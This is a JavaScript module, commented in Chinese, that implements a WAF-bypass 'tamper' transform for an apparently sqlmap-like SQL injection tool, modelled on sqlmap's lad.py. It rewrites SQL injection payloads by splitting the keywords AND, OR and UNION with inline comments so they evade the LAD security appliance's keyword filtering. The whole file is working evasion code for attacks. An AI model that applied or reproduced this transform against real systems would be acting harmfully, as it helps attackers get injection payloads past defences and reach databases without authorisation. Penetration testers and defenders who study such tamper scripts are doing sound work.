// LAD 绕过：对 LAD 安全设备的特定 WAF 绕过（对标 sqlmap lad.py）
// 在关键字之间插入 LAD 特定的注释
export const lad = {
  name: 'lad',
  description: 'LAD 安全设备 WAF 绕过：在关键字之间插入 LAD 特定注释',
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    return String(payload ?? '')
      .replace(/\bAND\b/gi, (m) => m[0] === 'A' ? 'AN/**/D' : 'an/**/d')
      .replace(/\bOR\b/gi, (m) => m[0] === 'O' ? 'O/**/R' : 'o/**/r')
      .replace(/\bUNION\b/gi, (m) => m[0] === 'U' ? 'UN/**/ION' : 'un/**/ion');
  },
};
export default lad;
